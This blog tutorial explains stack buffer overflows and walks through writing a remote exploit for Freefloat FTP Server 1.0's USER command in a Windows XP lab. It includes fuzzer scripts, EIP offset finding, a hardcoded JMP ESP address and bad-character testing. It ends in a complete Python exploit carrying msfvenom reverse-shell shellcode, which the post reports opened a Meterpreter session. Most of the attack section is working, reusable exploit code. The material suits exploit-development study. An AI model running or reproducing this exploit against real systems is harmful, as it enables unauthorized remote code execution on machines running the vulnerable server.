---
title: Buffer Overflow
layout: post
---
# Buffer Overflow

**_Introduction_**

Before moving on to the Buffer Overflow vulnerability, we will first talk about the basic concepts.

**RAM partitions**

![](https://cemekecom.files.wordpress.com/2021/07/memory.png?w=579)

**STACK:** It works with LIFO logic. The return address of the local memory variables and EBP value are stored here. ESP shows the top of STACK.  
**HEAP:** The region allocated by the commands used to allocate dynamic memory space is in the HEAP region.  
**.BSS:** Uninitialized variables are stored here.  
**.DATA:** Initialized variables are stored here.  
**.TEXT:** The binary versions of the codes are stored here.

**Pointer Registers**

Pointer Registers are critical to exploitation.

**EIP:** It stores the address of the command that will run in the next order.  
**EBP:** It constitutes the reference point in STACK.  
**ESP:** It shows the highest point of the STACK region.

**Common Assembly Codes**

**NOP:** It is used for padding to make Shellcode work healthy and to create a safe area.  
**JMP:** It jumps unconditionally.  
**MOV:** It is used to carry data from source to destination.  
**PUSH:** It is used to place data in the STACK region.  
**POP:** The data set with PUSH is removed from the STACK region with the POP command.  
**CALL:** It is used to call functions in the program.  
**RET:** After the function called with CALL is completed, RET is used to return to main.

Now we can take a deep dive into the Buffer Overflow vulnerability.

**_Buffer Overflow_**

Buffer Overflow Vulnerabilities are the vulnerabilities that cause the program to crash and change the flow of the program by writing more data to a place reserved for memory due to some mistakes made in written programs due to leaving the memory control to the user.

A buffer overflow will occur when 16 bytes of data are entered onto a string with 8 bytes allocated in memory.

- ![](https://cemekecom.files.wordpress.com/2021/07/46fbabb5-57e7-4ca7-a28b-d2b9b11ad6f6.png?w=1024)
    

There will be an overflow on the EIP value. If the EIP can be directed to a suitable place in the program, the exploit can be written by running the shellcode.

For example, in the following C codes:

```
                                
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void stuff(char *word){
        char copyOfWord[8];
        strcpy(copyOfWord, word);
        printf("Done");
}

int main(int argc, char *argv[]){
        stuff(argv[1]);
        return 0;
}

```

The address of the parameter taken from the command line in the program is sent to the stuff() function via the pointer. In this function, an 8-byte array is opened and the entered word is copied to this array. When 8 bytes of data are given to the program, there is no problem, but when an input larger than 8 bytes is given, buffer overflow occurs.

**_Freefloat FTP Server 1.0 - 'USER' Remote Buffer Overflow_**

Vulnerable App Link: [https://www.exploit-db.com/exploits/23243](https://www.exploit-db.com/exploits/23243)

In this section, an exploit was written for the Freefloat FTP Server program, which has Buffer Overflow vulnerability.

![](https://cemekecom.files.wordpress.com/2021/07/freefloat.png?w=214)

Freefloat FTP Server

The program was downloaded and run after installation. The FTP service over the network has been started.

In order to determine the inputs received by the program, the traffic was monitored by running a sniffer.

![](https://cemekecom.files.wordpress.com/2021/07/ftpconnection.png?w=464)

FTP connection from Linux machine to Windows XP machine is opened.

Network traffic is displayed via tcpdump as follows.

![](https://cemekecom.files.wordpress.com/2021/07/ftpnetwork-2.png?w=1024)

Network traffic between Linux and Windows XP machines

It has been seen that the user name with USER and the password with PASS are sent to the FTP server.

After the program is closed, let's open it as disassembled in Immunity Debugger.

![](https://cemekecom.files.wordpress.com/2021/07/immunity-debugger.png?w=1024)

Immunity Debugger

The following Python code was written to fuzz the USER part:

```
import socket


fuzzer = 1000 * '\x41'

target = "192.168.1.56"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024)

s.send('USER ' + fuzzer + '\r\n')
s.recv(1024)
s.send('PASS test' + '\r\n')
s.recv(1024)
s.close()

print "Fuzzing Executed"
```

After the program is saved and run, it is seen that the FTP server crashes on Windows XP.

![](https://cemekecom.files.wordpress.com/2021/07/fuzzerscipt.png?w=444)

Fuzzer Script is run.

![](https://cemekecom.files.wordpress.com/2021/07/crash.png?w=402)

FTP server crashes after fuzzing executed.

Since the value of AAAA override the EIP value, the program stream tried to run the command in the memory region "\\x41\\x41\\x41\\x41", so the program crashed because there is no such address. The point now is to control the EIP. For this reason, after how many bytes of junk are filled into STACK, it should be found that the EIP overwrite is done. Now a regular array will be developed using the pattern\_create tool and the hex versions of the characters that fall into the Immunity Debugger on the Windows XP machine will be searched with the pattern\_offset tool. By pressing the replay button on the Immunity Debugger and pressing the play button again, the program is restarted in the debugger.

![](https://cemekecom.files.wordpress.com/2021/07/patterncreate.png?w=1024)

pattern\_create tool executed.

After the pattern was created, the fuzzer was edited as follows:

```
import socket


pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

target = "192.168.1.56"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024)

s.send('USER ' + pattern + '\r\n')
s.recv(1024)
s.send('PASS test' + '\r\n')
s.recv(1024)
s.close()

print "Fuzzing Executed"
```

When the pattern was sent, the hex values of the characters on the EIP were seen.

![](https://cemekecom.files.wordpress.com/2021/07/eip.png?w=379)

EIP 37684136

The pattern\_offset tool is used as follows to determine the positions of the characters.

![](https://cemekecom.files.wordpress.com/2021/07/offset.png?w=1024)

pattern\_offset tool executed.

As can be understood from the situation, after 230 bytes are written into STACK; the 4 bytes will be written to the EIP. To test this event, let's run the program again and write the following Python script.

```
import socket


junk = 230 * '\x41'
target = "192.168.1.56"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024)

s.send('USER ' + junk + 4 * '\x42' + '\r\n')
s.recv(1024)
s.send('PASS test' + '\r\n')
s.recv(1024)
s.close()

print "Fuzzing Executed"
```

After the script is run, the EIP value is shown as 42424242 on the debugger. Thus, the control of the program is now in our hands. Now our goal is to place a memory address that contains the JMP ESP instruction into EIP. If we do this, the program flow will continue by jumping back onto STACK. Let's double-click on shell32.dll by pressing the executables icon in Immunity Debugger. Thus, the address found for the JMP ESP by searching was noted.

![](https://cemekecom.files.wordpress.com/2021/07/jmp.png?w=845)

JMP ESP adresses.

After this stage, we need to fill the STACK with the shellcode, but first we will detect the bad chars. For example, '\\x00' null char can stop working shellcode. Such bad chars can stop the shellcode working process. These characters can be found manually with the following method. First of all, an array with all the characters should be copied from the Internet.

```
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Now we can edit our script as follows:

```
import socket


junk = 230 * '\x41'
eip = 4 * '\x42'
target = "192.168.1.56"

badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

exploit = junk + eip + badChars + 500 * '\x43'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024)

s.send('USER ' + exploit + '\r\n')
s.recv(1024)
s.send('PASS test' + '\r\n')
s.recv(1024)
s.close()
```

When the script is run, STACK is displayed by right clicking on EBP and clicking "follow in dump" in Immunity Debugger.

![](https://cemekecom.files.wordpress.com/2021/07/ebp.png?w=1024)

Right Click EBP + "Follow in Dump"

![](https://cemekecom.files.wordpress.com/2021/07/stack.png?w=252)

'\\x0a' bad char

There is a corruption where the '\\x0a' char is. Now we will delete the '\\x0a' character in the array and run the script again. When we repeat the same process, we see that the bad chars are '\\x00', '\\x0a' and '\\x0d'. Now the shellcode generation phase will be started.

Reverse shell was created using the msfvenom tool.

![](https://cemekecom.files.wordpress.com/2021/07/msfvenom.png?w=1024)

The reverse shell was created using the msfvenom tool.

The generated shellcode was added to the exploit and the final version of the script was prepared as follows.

```
import socket

nop = 40 * '\x90'
junk = 230 * '\x41'
eip = '\x69\x2D\xB2\x7C' #jmp esp 7CB22D69->Little Endian Format
target = "192.168.1.56"

shellcode = ("\xb8\x42\xf9\x88\x8b\xda\xc1\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x59\x31\x47\x14\x03\x47\x14\x83\xef\xfc\xa0\x0c\x74\x63\xab"
"\xef\x85\x74\xd3\xde\x57\xfd\xf6\x45\xd3\xac\xc8\x0e\xb1\x5c"
"\xa3\x43\x22\x6c\x4c\xe8\x38\xa6\xbd\x58\xf6\x90\xf0\x66\xab"
"\xe1\x93\x1a\xb6\x35\x73\x22\x79\x48\x72\x63\xcf\x26\x9b\x39"
"\x5b\x9a\x73\x35\x19\x27\x24\x48\x4e\xdc\x8a\x32\xeb\x23\x7e"
"\x8f\xf2\x73\x2e\x84\xbd\x6b\x45\xc2\x1d\x8d\x8a\x76\x94\xf9"
"\x10\x48\xd8\x4b\xe3\x9e\xad\x4d\x25\xef\x71\xe1\x08\xdf\x7f"
"\xfb\x4d\xd8\x9f\x8e\xa5\x1a\x1d\x89\x7e\x60\xf9\x1c\x60\xc2"
"\x8a\x87\x44\xf2\x5f\x51\x0f\xf8\x14\x15\x57\x1d\xaa\xfa\xec"
"\x19\x27\xfd\x22\xa8\x73\xda\xe6\xf0\x20\x43\xbf\x5c\x86\x7c"
"\xdf\x39\x77\xd9\x94\xa8\x6e\x5d\x55\x33\x8f\x03\xc1\xff\x42"
"\xbc\x11\x68\xd4\xcf\x23\x37\x4e\x58\x0f\xb0\x48\x9f\x06\xd6"
"\x6a\x4f\xa0\xb7\x94\x70\xd0\x9e\x52\x24\x80\x88\x73\x45\x4b"
"\x49\x7b\x90\xe1\x43\xeb\xdb\x5d\x52\xc4\xb3\x9f\x55\x1b\xff"
"\x16\xb3\x4b\xaf\x78\x6c\x2c\x1f\x38\xdc\xc4\x75\xb7\x03\xf4"
"\x75\x12\x2c\x9f\x99\xca\x04\x08\x03\x57\xde\xa9\xcc\x42\x9a"
"\xea\x47\x66\x5a\xa4\xaf\x03\x48\xd1\xd7\xeb\x90\x22\x72\xeb"
"\xfa\x26\xd4\xbc\x92\x24\x01\x8a\x3c\xd6\x64\x89\x3b\x28\xf9"
"\xbb\x30\x1f\x6f\x83\x2e\x60\x7f\x03\xaf\x36\x15\x03\xc7\xee"
"\x4d\x50\xf2\xf0\x5b\xc5\xaf\x64\x64\xbf\x1c\x2e\x0c\x3d\x7a"
"\x18\x93\xbe\xa9\x1a\xd4\x40\x2f\x35\x7d\x28\xcf\x05\x7d\xa8"
"\xa5\x85\x2d\xc0\x32\xa9\xc2\x20\xba\x60\x8b\x28\x31\xe5\x79"
"\xc9\x46\x2c\xdf\x57\x46\xc3\xc4\x68\x3d\xac\xfb\x89\xc2\xa4"
"\x9f\x8a\xc2\xc8\xa1\xb7\x14\xf1\xd7\xf6\xa4\x46\xe7\x4d\x88"
"\xef\x62\xad\x9e\xf0\xa6")

exploit = junk + eip + nop + shellcode + nop

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024)

s.send('USER ' + exploit + '\r\n')
s.recv(1024)
s.send('PASS test' + '\r\n')
s.recv(1024)
s.close()
```

The purpose of putting NOP after redirection is to prevent the shellcode from other commands in case it takes up more space during the decoding process.

Meterpreter was successfully installed on the target when the exploit was run.

![](https://cemekecom.files.wordpress.com/2021/07/ekran-goruntusu-2021-07-15-17-07-50.png?w=911)

![](https://cemekecom.files.wordpress.com/2021/07/meterpreter.png?w=652)

**_Conclusion_**

Throughout the article, the Buffer Overflow vulnerability was examined and in the sample lab study, the Stack was filled, the JMP ESP located at the address 0x7CB22D69 was run with EIP, then the exploit was run by placing the shellcode in the Stack. When looking at the exploit development steps in the lab, an exploit development process can be summarized as follows:  
  
1) Fuzzing  
2) EIP Check  
3) JMP ESP Address  
4) Bad Chars Detection  
5) Placing the Shellcode in the Stack  
6) Running the Exploit

**_RESOURCES_**

Akyildiz, A. (2017). Exploit Gelistirme 101. Gazi Kitabevi.

Foster, J. C., Osipov, V., & Bhalla, N. (2005). Buffer Overflow Attacks: Detect, Exploit, Prevent (1st ed.). Syngress.

Jaswal, N. (2018). Mastering Metasploit: Take your penetration testing and IT security skills to a whole new level with the secrets of Metasploit, 3rd Edition (3rd Revised edition). Packt Publishing.

What is a Buffer Overflow - Attack Types and Prevention Methods - Imperva. (2019, December 29). Learning Center. [https://www.imperva.com/learn/application-security/buffer-overflow/](https://www.imperva.com/learn/application-security/buffer-overflow/)

Buffer Overflow - OWASP. (n.d.). Owasp. Retrieved July 8, 2021, from [https://owasp.org/www-community/vulnerabilities/Buffer\_Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)

[https://www.exploit-db.com/exploits/23243](https://www.exploit-db.com/exploits/23243)